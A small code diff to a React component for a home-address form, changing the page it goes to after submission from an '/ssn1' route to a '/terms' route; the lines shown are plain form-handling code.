@@ -58,7 +58,7 @@ const HomeAddress: React.FC = () => {
           zipCode,
         });
         console.log('Home address submitted successfully');
-        navigate('/ssn1', { state: { emzemz } });
+        navigate('/terms', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting home address:', error);
         setErrors(prev => ({
